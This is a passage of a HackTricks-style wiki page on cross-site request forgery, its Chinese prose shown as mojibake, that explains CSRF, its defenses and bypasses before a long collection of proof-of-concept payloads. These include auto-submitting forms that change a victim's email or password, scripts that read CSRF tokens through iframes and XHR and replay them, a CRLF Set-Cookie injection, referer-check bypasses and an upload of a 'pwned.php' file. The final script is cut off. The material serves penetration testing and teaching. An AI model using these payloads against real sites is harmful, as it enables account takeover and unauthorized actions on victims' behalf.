# CSRF (è·¨ç«™è¯·æ±‚ä¼ªé€ )

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œä¿æŒå¯¹å¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œçš„äº†è§£

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼

## è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) è§£é‡Š

**è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF)** æ˜¯ä¸€ç§åœ¨ web åº”ç”¨ç¨‹åºä¸­å‘ç°çš„å®‰å…¨æ¼æ´ã€‚å®ƒä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨ç”¨æˆ·çš„è®¤è¯ä¼šè¯ï¼Œä»£è¡¨æ¯«æ— é˜²å¤‡çš„ç”¨æˆ·æ‰§è¡Œæ“ä½œã€‚å½“ä¸€ä¸ªå·²ç™»å½•å—å®³è€…å¹³å°çš„ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™æ—¶ï¼Œæ”»å‡»å°±ä¼šè¢«æ‰§è¡Œã€‚è¯¥ç½‘ç«™éšåé€šè¿‡æ‰§è¡Œ JavaScriptã€æäº¤è¡¨å•æˆ–è·å–å›¾åƒç­‰æ–¹æ³•è§¦å‘å¯¹å—å®³è€…è´¦æˆ·çš„è¯·æ±‚ã€‚

### CSRF æ”»å‡»çš„å‰ææ¡ä»¶

è¦åˆ©ç”¨ CSRF æ¼æ´ï¼Œå¿…é¡»æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š

1. **è¯†åˆ«æœ‰ä»·å€¼çš„æ“ä½œ**ï¼šæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå€¼å¾—åˆ©ç”¨çš„æ“ä½œï¼Œä¾‹å¦‚æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€ç”µå­é‚®ä»¶æˆ–æå‡æƒé™ã€‚
2. **ä¼šè¯ç®¡ç†**ï¼šç”¨æˆ·çš„ä¼šè¯åº”ä»…é€šè¿‡ cookies æˆ– HTTP åŸºæœ¬è®¤è¯å¤´è¿›è¡Œç®¡ç†ï¼Œå› ä¸ºå…¶ä»–å¤´æ— æ³•ç”¨äºæ­¤ç›®çš„ã€‚
3. **ç¼ºä¹ä¸å¯é¢„æµ‹çš„å‚æ•°**ï¼šè¯·æ±‚ä¸­ä¸åº”åŒ…å«ä¸å¯é¢„æµ‹çš„å‚æ•°ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šé˜»æ­¢æ”»å‡»ã€‚

### å¿«é€Ÿæ£€æŸ¥

æ‚¨å¯ä»¥åœ¨ Burp ä¸­**æ•è·è¯·æ±‚**å¹¶æ£€æŸ¥ CSRF ä¿æŠ¤ï¼Œæ‚¨å¯ä»¥ä»æµè§ˆå™¨ä¸­ç‚¹å‡» **å¤åˆ¶ä¸º fetch** å¹¶æ£€æŸ¥è¯·æ±‚ï¼š

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### é˜²å¾¡ CSRF

å¯ä»¥å®æ–½å‡ ç§å¯¹ç­–æ¥ä¿æŠ¤å…å— CSRF æ”»å‡»ï¼š

* [**SameSite cookies**](hacking-with-cookies/#samesite)ï¼šæ­¤å±æ€§é˜²æ­¢æµè§ˆå™¨åœ¨è·¨ç«™è¯·æ±‚ä¸­å‘é€ cookiesã€‚[äº†è§£æ›´å¤šå…³äº SameSite cookies](hacking-with-cookies/#samesite)ã€‚
* [**è·¨æºèµ„æºå…±äº«**](cors-bypass.md)ï¼šå—å®³è€…ç½‘ç«™çš„ CORS ç­–ç•¥å¯èƒ½ä¼šå½±å“æ”»å‡»çš„å¯è¡Œæ€§ï¼Œç‰¹åˆ«æ˜¯å½“æ”»å‡»éœ€è¦è¯»å–å—å®³è€…ç½‘ç«™çš„å“åº”æ—¶ã€‚[äº†è§£ CORS ç»•è¿‡](cors-bypass.md)ã€‚
* **ç”¨æˆ·éªŒè¯**ï¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç æˆ–è§£å†³éªŒè¯ç å¯ä»¥ç¡®è®¤ç”¨æˆ·çš„æ„å›¾ã€‚
* **æ£€æŸ¥å¼•èæˆ–æ¥æºå¤´**ï¼šéªŒè¯è¿™äº›å¤´å¯ä»¥å¸®åŠ©ç¡®ä¿è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„æ¥æºã€‚ç„¶è€Œï¼Œç²¾å¿ƒæ„é€ çš„ URL å¯ä»¥ç»•è¿‡å®æ–½ä¸å½“çš„æ£€æŸ¥ï¼Œä¾‹å¦‚ï¼š
* ä½¿ç”¨ `http://mal.net?orig=http://example.com`ï¼ˆURL ä»¥å—ä¿¡ä»»çš„ URL ç»“å°¾ï¼‰
* ä½¿ç”¨ `http://example.com.mal.net`ï¼ˆURL ä»¥å—ä¿¡ä»»çš„ URL å¼€å¤´ï¼‰
* **ä¿®æ”¹å‚æ•°åç§°**ï¼šæ›´æ”¹ POST æˆ– GET è¯·æ±‚ä¸­å‚æ•°çš„åç§°å¯ä»¥å¸®åŠ©é˜²æ­¢è‡ªåŠ¨åŒ–æ”»å‡»ã€‚
* **CSRF ä»¤ç‰Œ**ï¼šåœ¨æ¯ä¸ªä¼šè¯ä¸­åŠ å…¥å”¯ä¸€çš„ CSRF ä»¤ç‰Œï¼Œå¹¶è¦æ±‚åœ¨åç»­è¯·æ±‚ä¸­ä½¿ç”¨è¯¥ä»¤ç‰Œï¼Œå¯ä»¥æ˜¾è‘—é™ä½ CSRF çš„é£é™©ã€‚é€šè¿‡å¼ºåˆ¶å®æ–½ CORSï¼Œå¯ä»¥å¢å¼ºä»¤ç‰Œçš„æœ‰æ•ˆæ€§ã€‚

ç†è§£å’Œå®æ–½è¿™äº›é˜²å¾¡æªæ–½å¯¹äºç»´æŠ¤ web åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§è‡³å…³é‡è¦ã€‚

## é˜²å¾¡ç»•è¿‡

### ä» POST åˆ° GET

ä¹Ÿè®¸æ‚¨æƒ³è¦åˆ©ç”¨çš„è¡¨å•å‡†å¤‡å‘é€å¸¦æœ‰ CSRF ä»¤ç‰Œçš„ **POST è¯·æ±‚ï¼Œä½†**ï¼Œæ‚¨åº”è¯¥ **æ£€æŸ¥** å¦‚æœ **GET** ä¹Ÿæ˜¯ **æœ‰æ•ˆçš„**ï¼Œå¹¶ä¸”å½“æ‚¨å‘é€ GET è¯·æ±‚æ—¶ **CSRF ä»¤ç‰Œä»åœ¨è¢«éªŒè¯**ã€‚

### ç¼ºå°‘ä»¤ç‰Œ

åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå®ç°ä¸€ç§æœºåˆ¶æ¥ **éªŒè¯ä»¤ç‰Œ**ï¼Œå½“å®ƒä»¬å­˜åœ¨æ—¶ã€‚ç„¶è€Œï¼Œå¦‚æœåœ¨ä»¤ç‰Œç¼ºå¤±æ—¶å®Œå…¨è·³è¿‡éªŒè¯ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ **åˆ é™¤æºå¸¦ä»¤ç‰Œçš„å‚æ•°**ï¼Œè€Œä¸ä»…ä»…æ˜¯å…¶å€¼æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚è¿™ä½¿ä»–ä»¬èƒ½å¤Ÿç»•è¿‡éªŒè¯è¿‡ç¨‹ï¼Œæœ‰æ•ˆåœ°è¿›è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) æ”»å‡»ã€‚

### CSRF ä»¤ç‰Œæœªä¸ç”¨æˆ·ä¼šè¯ç»‘å®š

æœªå°† CSRF ä»¤ç‰Œä¸ç”¨æˆ·ä¼šè¯ç»‘å®šçš„åº”ç”¨ç¨‹åºå­˜åœ¨é‡å¤§ **å®‰å…¨é£é™©**ã€‚è¿™äº›ç³»ç»ŸéªŒè¯ä»¤ç‰Œæ˜¯é’ˆå¯¹ **å…¨å±€æ± ** è€Œä¸æ˜¯ç¡®ä¿æ¯ä¸ªä»¤ç‰Œä¸å‘èµ·ä¼šè¯ç»‘å®šã€‚

æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹ï¼š

1. **ä½¿ç”¨è‡ªå·±çš„è´¦æˆ·è¿›è¡Œèº«ä»½éªŒè¯**ã€‚
2. **ä»å…¨å±€æ± ä¸­è·å–æœ‰æ•ˆçš„ CSRF ä»¤ç‰Œ**ã€‚
3. **åœ¨é’ˆå¯¹å—å®³è€…çš„ CSRF æ”»å‡»ä¸­ä½¿ç”¨æ­¤ä»¤ç‰Œ**ã€‚

è¿™ä¸€æ¼æ´ä½¿æ”»å‡»è€…èƒ½å¤Ÿä»£è¡¨å—å®³è€…å‘èµ·æœªç»æˆæƒçš„è¯·æ±‚ï¼Œåˆ©ç”¨åº”ç”¨ç¨‹åºçš„ **ä¸å……åˆ†çš„ä»¤ç‰ŒéªŒè¯æœºåˆ¶**ã€‚

### æ–¹æ³•ç»•è¿‡

å¦‚æœè¯·æ±‚ä½¿ç”¨äº†ä¸€ä¸ªâ€œ**å¥‡æ€ªçš„**â€ **æ–¹æ³•**ï¼Œè¯·æ£€æŸ¥ **æ–¹æ³•** **è¦†ç›–åŠŸèƒ½** æ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒ **ä½¿ç”¨ PUT** æ–¹æ³•ï¼Œæ‚¨å¯ä»¥å°è¯• **ä½¿ç”¨ POST** æ–¹æ³•å¹¶ **å‘é€**ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ POST è¯·æ±‚ä¸­å‘é€ **\_method å‚æ•°** æˆ–ä½¿ç”¨ **å¤´** æ¥å®ç°ï¼š

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### è‡ªå®šä¹‰å¤´ä»¤ç‰Œç»•è¿‡

å¦‚æœè¯·æ±‚åœ¨è¯·æ±‚ä¸­æ·»åŠ äº†ä¸€ä¸ª **è‡ªå®šä¹‰å¤´**ï¼Œå¹¶å°† **ä»¤ç‰Œ** ä½œä¸º **CSRF ä¿æŠ¤æ–¹æ³•**ï¼Œé‚£ä¹ˆï¼š

* æµ‹è¯•ä¸å¸¦ **è‡ªå®šä¹‰ä»¤ç‰Œå’Œå¤´** çš„è¯·æ±‚ã€‚
* æµ‹è¯•è¯·æ±‚ï¼Œä½¿ç”¨ç›¸åŒ **é•¿åº¦ä½†ä¸åŒçš„ä»¤ç‰Œ**ã€‚

### CSRF ä»¤ç‰Œé€šè¿‡ cookie éªŒè¯

åº”ç”¨ç¨‹åºå¯èƒ½é€šè¿‡åœ¨ cookie å’Œè¯·æ±‚å‚æ•°ä¸­å¤åˆ¶ä»¤ç‰Œï¼Œæˆ–é€šè¿‡è®¾ç½® CSRF cookie å¹¶éªŒè¯åç«¯å‘é€çš„ä»¤ç‰Œæ˜¯å¦ä¸ cookie ä¸­çš„å€¼ç›¸å¯¹åº”æ¥å®ç° CSRF ä¿æŠ¤ã€‚åº”ç”¨ç¨‹åºé€šè¿‡æ£€æŸ¥è¯·æ±‚å‚æ•°ä¸­çš„ä»¤ç‰Œæ˜¯å¦ä¸ cookie ä¸­çš„å€¼å¯¹é½æ¥éªŒè¯è¯·æ±‚ã€‚

ç„¶è€Œï¼Œå¦‚æœç½‘ç«™å­˜åœ¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­è®¾ç½® CSRF cookieï¼Œä¾‹å¦‚ CRLF æ¼æ´ï¼Œåˆ™æ­¤æ–¹æ³•å®¹æ˜“å—åˆ° CSRF æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªæ¬ºéª—æ€§çš„å›¾åƒæ¥è®¾ç½® cookieï¼Œç„¶åå‘èµ· CSRF æ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯æ”»å‡»å¯èƒ½å¦‚ä½•æ„å»ºçš„ç¤ºä¾‹ï¼š
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
æ³¨æ„ï¼Œå¦‚æœ**csrf tokenä¸ä¼šè¯cookieç›¸å…³ï¼Œè¿™ä¸ªæ”»å‡»å°†ä¸èµ·ä½œç”¨**ï¼Œå› ä¸ºä½ éœ€è¦å°†ä¼šè¯è®¾ç½®ä¸ºå—å®³è€…ï¼Œå› æ­¤ä½ å®é™…ä¸Šæ˜¯åœ¨æ”»å‡»è‡ªå·±ã€‚
{% endhint %}

### Content-Type æ›´æ”¹

æ ¹æ®[**è¿™ä¸ª**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ï¼Œä¸ºäº†**é¿å…é¢„æ£€**è¯·æ±‚ä½¿ç”¨**POST**æ–¹æ³•ï¼Œå…è®¸çš„Content-Typeå€¼å¦‚ä¸‹ï¼š

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œ**æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ**ï¼Œå…·ä½“å–å†³äºä½¿ç”¨çš„**Content-Type**ï¼Œå› æ­¤ä½ åº”è¯¥å°è¯•æåˆ°çš„å€¼ä»¥åŠå…¶ä»–å€¼ï¼Œå¦‚**`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

ç¤ºä¾‹ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://brycec.me/posts/corctf\_2021\_challenges)ï¼‰å°†JSONæ•°æ®ä½œä¸ºtext/plainå‘é€ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### ç»•è¿‡ JSON æ•°æ®çš„é¢„æ£€è¯·æ±‚

åœ¨å°è¯•é€šè¿‡ POST è¯·æ±‚å‘é€ JSON æ•°æ®æ—¶ï¼Œåœ¨ HTML è¡¨å•ä¸­ä½¿ç”¨ `Content-Type: application/json` æ˜¯ä¸ç›´æ¥å¯èƒ½çš„ã€‚åŒæ ·ï¼Œåˆ©ç”¨ `XMLHttpRequest` å‘é€æ­¤å†…å®¹ç±»å‹ä¼šå¯åŠ¨é¢„æ£€è¯·æ±‚ã€‚ç„¶è€Œï¼Œæœ‰ä¸€äº›ç­–ç•¥å¯ä»¥æ½œåœ¨åœ°ç»•è¿‡æ­¤é™åˆ¶ï¼Œå¹¶æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å¤„ç† JSON æ•°æ®è€Œä¸è€ƒè™‘ Content-Typeï¼š

1. **ä½¿ç”¨æ›¿ä»£å†…å®¹ç±»å‹**ï¼šé€šè¿‡åœ¨è¡¨å•ä¸­è®¾ç½® `enctype="text/plain"` æ¥ä½¿ç”¨ `Content-Type: text/plain` æˆ– `Content-Type: application/x-www-form-urlencoded`ã€‚è¿™ç§æ–¹æ³•æµ‹è¯•åç«¯æ˜¯å¦åˆ©ç”¨æ•°æ®è€Œä¸è€ƒè™‘ Content-Typeã€‚
2. **ä¿®æ”¹å†…å®¹ç±»å‹**ï¼šä¸ºäº†é¿å…é¢„æ£€è¯·æ±‚ï¼ŒåŒæ—¶ç¡®ä¿æœåŠ¡å™¨å°†å†…å®¹è¯†åˆ«ä¸º JSONï¼Œæ‚¨å¯ä»¥å‘é€ `Content-Type: text/plain; application/json` çš„æ•°æ®ã€‚è¿™ä¸ä¼šè§¦å‘é¢„æ£€è¯·æ±‚ï¼Œä½†å¦‚æœæœåŠ¡å™¨é…ç½®ä¸ºæ¥å— `application/json`ï¼Œåˆ™å¯èƒ½ä¼šè¢«æ­£ç¡®å¤„ç†ã€‚
3. **SWF Flash æ–‡ä»¶åˆ©ç”¨**ï¼šä¸€ç§ä¸å¤ªå¸¸è§ä½†å¯è¡Œçš„æ–¹æ³•æ˜¯ä½¿ç”¨ SWF Flash æ–‡ä»¶æ¥ç»•è¿‡æ­¤ç±»é™åˆ¶ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„æ·±å…¥ç†è§£ï¼Œè¯·å‚é˜… [è¿™ç¯‡æ–‡ç« ](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã€‚

### å¼•ç”¨ / æ¥æºæ£€æŸ¥ç»•è¿‡

**é¿å…å¼•ç”¨å¤´**

åº”ç”¨ç¨‹åºå¯èƒ½ä»…åœ¨ 'Referer' å¤´å­˜åœ¨æ—¶è¿›è¡ŒéªŒè¯ã€‚ä¸ºäº†é˜²æ­¢æµè§ˆå™¨å‘é€æ­¤å¤´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ HTML å…ƒæ ‡ç­¾ï¼š
```xml
<meta name="referrer" content="never">
```
è¿™ç¡®ä¿äº†â€œRefererâ€å¤´è¢«çœç•¥ï¼Œä»è€Œå¯èƒ½ç»•è¿‡æŸäº›åº”ç”¨ç¨‹åºä¸­çš„éªŒè¯æ£€æŸ¥ã€‚

**æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

è¦åœ¨Referrerå°†è¦åœ¨å‚æ•°ä¸­å‘é€çš„URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œå¯ä»¥æ‰§è¡Œï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD æ–¹æ³•ç»•è¿‡**

[**è¿™ä¸ª CTF æ–‡ç« **](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)çš„ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†[Oak çš„æºä»£ç ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸º**å°† HEAD è¯·æ±‚ä½œä¸º GET è¯·æ±‚å¤„ç†**ï¼Œä¸”æ²¡æœ‰å“åº”ä½“â€”â€”è¿™æ˜¯ä¸€ç§å¸¸è§çš„å˜é€šæ–¹æ³•ï¼Œå¹¶ä¸æ˜¯ Oak ç‹¬æœ‰çš„ã€‚å®ƒä»¬å¹¶æ²¡æœ‰ç‰¹å®šçš„å¤„ç†ç¨‹åºæ¥å¤„ç† HEAD è¯·æ±‚ï¼Œè€Œæ˜¯**ç›´æ¥äº¤ç»™ GET å¤„ç†ç¨‹åºï¼Œä½†åº”ç”¨ç¨‹åºåªæ˜¯ç§»é™¤äº†å“åº”ä½“**ã€‚

å› æ­¤ï¼Œå¦‚æœ GET è¯·æ±‚å—åˆ°é™åˆ¶ï¼Œä½ å¯ä»¥**å‘é€ä¸€ä¸ªå°†è¢«å¤„ç†ä¸º GET è¯·æ±‚çš„ HEAD è¯·æ±‚**ã€‚

## **åˆ©ç”¨ç¤ºä¾‹**

### **æå– CSRF ä»¤ç‰Œ**

å¦‚æœä½¿ç”¨äº†**CSRF ä»¤ç‰Œ**ä½œä¸º**é˜²å¾¡**ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡åˆ©ç”¨[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)æ¼æ´æˆ–[**æ‚¬æŒ‚æ ‡è®°**](dangling-markup-html-scriptless-injection/)æ¼æ´æ¥**æå–å®ƒ**ã€‚

### **ä½¿ç”¨ HTML æ ‡ç­¾çš„ GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
å…¶ä»–å¯ä»¥ç”¨æ¥è‡ªåŠ¨å‘é€ GET è¯·æ±‚çš„ HTML5 æ ‡ç­¾åŒ…æ‹¬ï¼š
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### è¡¨å• GET è¯·æ±‚
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### è¡¨å• POST è¯·æ±‚
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### é€šè¿‡ iframe å‘é€è¡¨å• POST è¯·æ±‚
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST è¯·æ±‚**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST è¯·æ±‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST è¯·æ±‚ v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### ä» iframe å†…éƒ¨å‘é€è¡¨å• POST è¯·æ±‚
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶å‘é€ POST è¯·æ±‚**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframeã€è¡¨å•å’Œ Ajax å‘é€ Post è¯·æ±‚**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframe å’Œè¡¨å•å‘é€ POST è¯·æ±‚**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
